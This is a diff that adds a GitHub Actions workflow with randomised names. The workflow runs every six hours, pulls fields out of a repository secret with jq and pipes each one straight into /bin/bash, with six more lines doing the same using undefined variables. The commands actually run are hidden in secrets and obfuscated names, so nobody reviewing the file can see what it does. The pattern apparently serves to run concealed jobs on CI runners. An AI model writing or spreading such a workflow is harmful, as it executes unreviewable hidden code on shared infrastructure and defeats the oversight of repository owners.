@@ -1,0 +1,22 @@
+name: zhouliujianyii
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '44 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhouliujianyii
+        env:
+          euo46: ${{ secrets.euo46 }}
+        run: |
+          echo $euo46 | jq -r .nk48 | /bin/bash
+          echo $q5 | jq -r .ww33 | /bin/bash
+          echo $xek4 | jq -r .mbu60429 | /bin/bash
+          echo $fu19 | jq -r .ooyw11734 | /bin/bash
+          echo $a284 | jq -r .qxak9 | /bin/bash
+          echo $w4 | jq -r .ymnk4702 | /bin/bash
+          echo $eike8321 | jq -r .dbtky8 | /bin/bash
+
